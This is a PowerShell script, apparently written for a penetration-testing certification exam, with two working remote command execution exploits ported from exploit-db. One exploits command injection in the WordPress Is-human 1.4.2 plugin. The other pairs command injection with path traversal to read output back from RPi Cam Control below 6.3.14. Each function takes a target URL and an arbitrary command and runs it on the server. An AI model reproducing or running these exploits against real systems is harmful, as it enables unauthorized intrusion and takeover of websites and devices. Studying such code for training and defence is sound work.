function Exploit-Ishuman
{ 
<#

.SYNOPSIS
A powershell script that Port two command injection exploits from exploit-db to PowerShell.
.DESCRIPTION
This function exploit "WordPress Plugin Is-human 1.4.2 - Remote Command Execution".
 
.PARAMTER cmd
command to be executed on target website.


.PARAMTER Url
Url of the vulnerable website.

.EXAMPLE
PS C:\> . .\Exploits.ps1
PS C:\> Exploit-Ishuman -Url http://192.168.126.162/wordpress -cmd "pwd;id"

.LINK
https://www.exploit-db.com/exploits/17299/

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam.
" http://www.securitytube-training.com/online-courses/powershell-for-pentesters/ "
Student ID: PSP - 3224
#>

	[CmdletBinding()]
	Param (
	    
		[Parameter(Mandatory=$false)]
		[String]
		$cmd = "whoami",

		[Parameter(Mandatory=$true)]
		[String]
		$Url
	)

    #encoding command to base64
    $base64_cmd = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$cmd"))
    try
    {
        $Urlreq = "$Url/wp-content/plugins/is-human/engine.php?action=log-reset&type=ih_options();system(base64_decode($base64_cmd));error"
        $req = Invoke-RestMethod -Uri $Urlreq
        Write-Host "Output is: " -ForegroundColor Green
        $req.replace("Array", "")
    }
    catch
    {
        Write-Host "Exploit failed" -ForegroundColor Red
    }

}


function Exploit-RPiCam
{
<#

.SYNOPSIS
A powershell script that Port two command injection exploits from exploit-db to PowerShell.
.DESCRIPTION
This function exploit "RPi Cam Control < 6.3.14 - Multiple Vulnerabilities".
 
.PARAMTER cmd
command to be executed on target website.


.PARAMTER Url
Url of the vulnerable website.

.PARAMTER Writeable_directroy
Writeable directroy to write output in.

.EXAMPLE
PS C:\> . .\Exploits.ps1
PS C:\> Exploit-RPiCam
PS C:\> Exploit-RPiCam -Url http://192.168.126.162/RPiCam -Writeable_directroy "/var/www/html/RPiCam" -cmd "id"

.LINK
https://www.exploit-db.com/exploits/42638/

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam.
" http://www.securitytube-training.com/online-courses/powershell-for-pentesters/ "
Student ID: PSP - 3224
#>

	[CmdletBinding()]
	Param (
	    
		[Parameter(Mandatory=$false)]
		[String]
		$cmd = "whoami",

		[Parameter(Mandatory=$true)]
		[String]
		$Url,

		[Parameter(Mandatory=$true)]
		[String]
		$Writeable_directroy

	)
    try
    {
        #Executing command blindly and store output in $Writeable_directroy
        $Urlreq = "$Url/preview.php"
        $Bodycmd = "convert=none&convertCmd=`$($cmd > $Writeable_directroy/output2.txt)"
        $reqcmd = Invoke-RestMethod -Uri $Urlreq -Method Post -Body $Bodycmd

        #Reading output file
        $Bodyfile = "download1=../../../../../../../../../../../../../../../../$Writeable_directroy/output2.txt.v0000.t"
        $req = Invoke-RestMethod -Uri $Urlreq -Method Post -Body $Bodyfile
        Write-Host "Output is: " -ForegroundColor Green
        $req
    }
    catch
    {
        Write-Host "Exploit failed" -ForegroundColor Red
    }
}